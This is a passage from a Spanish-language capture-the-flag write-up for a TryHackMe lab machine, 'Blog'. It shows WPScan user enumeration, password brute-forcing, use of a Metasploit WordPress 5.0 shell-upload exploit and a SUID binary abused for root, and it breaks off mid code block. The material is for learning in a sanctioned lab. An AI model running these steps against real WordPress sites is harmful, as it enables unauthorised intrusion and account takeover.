 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Robots Txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confidence: 100%

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; http://blog.thm/xmlrpc.php
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Direct Access &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confidence: 100%
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; References:
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - http://codex.wordpress.org/XML-RPC_Pingback_API
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; http://blog.thm/readme.html
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Direct Access &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confidence: 100%

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Direct Access &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confidence: 100%

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; http://blog.thm/wp-cron.php
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Direct Access &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confidence: 60%
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; References:
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - https://www.iplocation.net/defend-wordpress-from-ddos
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - https://github.com/wpscanteam/wpscan/issues/1299

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; WordPress version 5.0 identified &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Insecure, released on 2018-12-06&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Rss Generator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - http://blog.thm/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5.0&amp;lt;/generator&amp;gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - http://blog.thm/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5.0&amp;lt;/generator&amp;gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; WordPress theme in use: twentytwenty
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Location: http://blog.thm/wp-content/themes/twentytwenty/
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Last Updated: 2020-06-10T00:00:00.000Z
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; The version is out of date, the latest version is 1.4
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.3
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Style Name: Twenty Twenty
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Style URI: https://wordpress.org/themes/twentytwenty/
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Description: Our default theme &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; is designed to take full advantage of the flexibility of the block editor...
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Author: the WordPress team
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Author URI: https://wordpress.org/
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Css Style In Homepage &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confirmed By: Css Style In &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; Page &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Version: 1.3 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;80% confidence&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Style &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1.3, Match: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Version: 1.3&amp;#39;&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerating Users &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;via Passive and Aggressive Methods&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 Brute Forcing Author IDs - Time: 00:00:06 &amp;lt;&lt;span class=&#34;o&#34;&gt;====================================================================================================================================&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; / 10&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 100.00% Time: 00:00:06

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Identified:

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; kwheel
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Author Posts - Author Pattern &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confirmed By:
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Wp Json Api &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   - http://blog.thm/wp-json/wp/v2/users/?per_page&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;100&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;page&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Author Id Brute Forcing - Author Pattern &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Login Error Messages &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; bjoel
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Author Posts - Author Pattern &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confirmed By:
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Wp Json Api &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   - http://blog.thm/wp-json/wp/v2/users/?per_page&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;100&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;page&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Author Id Brute Forcing - Author Pattern &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Login Error Messages &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Karen Wheeler
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Rss Generator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confirmed By: Rss Generator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Billy Joel
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Found By: Rss Generator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Passive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Confirmed By: Rss Generator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Aggressive Detection&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; No WPVulnDB API Token given, as a result vulnerability data has not been output.
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; You can get a free API token with &lt;span class=&#34;m&#34;&gt;50&lt;/span&gt; daily requests by registering at https://wpvulndb.com/users/sign_up.

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Finished: Thu Jul &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt; 16:53:07 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Requests Done: &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Cached Requests: &lt;span class=&#34;m&#34;&gt;35&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Data Sent: 6.06 KB
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Data Received: 154.571 KB
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Memory used: 117.724 MB
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Elapsed time: 00:00:19

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos wpscan para hacer un ataque de fuerza bruta con los usuarios que encontramos, primero intentamos con el usuario &lt;code&gt;kwheel&lt;/code&gt; al que logramos encontrar la contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/Screenshot_20200723_165556.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;www-data---user&#34;&gt;WWW-DATA - USER&lt;/h2&gt;
&lt;p&gt;Con las credenciales que encontramos, editamos el archivo, pero no podemos realizar alguna modificacion a los archivos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/Screenshot_20200723_165800.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Buscamos exploits/vulnerabilidades de la version de wordpress y vemos un exploit para metasploit que afecta esta version.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@upset:~/thm/blog# searchsploit wordpress 5.0
---------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                                  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Path
                                                                                                                &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/usr/share/exploitdb/&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
---------------------------------------------------------------------------------------------------------------- ----------------------------------------
WordPress 5.0.0 - Crop-image Shell Upload &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Metasploit&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                                                          &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; exploits/php/remote/46662.rb
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
---------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos metasploit con el exploit que encontramos y logramos obtener una shell en la maquina con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/Screenshot_20200723_171222.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el directorio &lt;code&gt;/home/bjoel&lt;/code&gt; encontramos la &amp;ldquo;flag user.txt&amp;rdquo; pero no contiene lo que buscamos, además encontramos un pdf que tiene informacion sobre Rubber Ducky.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;www-data@blog:/home/bjoel$ 
ls -lah
total 100K
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; bjoel bjoel 4.0K May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 20:08 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root  root  4.0K May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 18:02 ..
lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root  root     &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 18:18 .bash_history -&amp;gt; /dev/null
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; bjoel bjoel  &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Apr  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; .bash_logout
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; bjoel bjoel 3.7K Apr  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; .bashrc
drwx------ &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; bjoel bjoel 4.0K May &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 13:15 .cache
drwx------ &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; bjoel bjoel 4.0K May &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 13:15 .gnupg
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; bjoel bjoel  &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; Apr  &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; .profile
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; bjoel bjoel    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; 13:16 .sudo_as_admin_successful
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; bjoel bjoel  68K May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 18:33 Billy_Joel_Termination_May20-2020.pdf
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; bjoel bjoel   &lt;span class=&#34;m&#34;&gt;57&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 20:08 user.txt
www-data@blog:/home/bjoel$ cat user.txt
cat user.txt
You won&lt;span class=&#34;s1&#34;&gt;&amp;#39;t find what you&amp;#39;&lt;/span&gt;re looking &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; here.

TRY HARDER
www-data@blog:/home/bjoel$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Billy_Joel_Termination_May20-2020.pdf&lt;/strong&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blog/Screenshot_20200723_190743.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion en la maquina por binarios/archivos SUID, encontramos un archivo ejecutable, al ejecutarlo nos muestra un mensaje de &lt;code&gt;Not an Admin&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ind / -perm -4000 2&amp;gt; /dev/null &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; xargs ls -lah
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root             99K Nov &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-sr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root            8.3K May &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 18:27 /usr/sbin/checker
file /usr/sbin/checker
/usr/sbin/checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SYSV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;]=&lt;/span&gt;6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped

&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Revisamos los strings del ejecutable y encontramos algunos &lt;code&gt;strings&lt;/code&gt; interesantes, como &lt;code&gt;/bin/bash&lt;/code&gt;, &lt;code&gt;setuid, puts, getenv, system&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
puts
getenv
system
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
admin
/bin/bash
Not an Admin
&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;*3$&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;crtstuff.c
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;deregister_tm_clones
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[... REDACTED ...]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos Ghidra para analizar el archivo, vemos la funcion &lt;code&gt;main&lt;/code&gt;, donde tiene una variable que obtiene (&lt;a href=&#34;https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm&#34;&gt;&lt;strong&gt;getenv()&lt;/strong&gt;&lt;/a&gt;) la variable &lt;code&gt;admin&lt;/code&gt;, en el caso de que esta variable este vacia se cierra el programa, en otro caso retorna una shell con usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
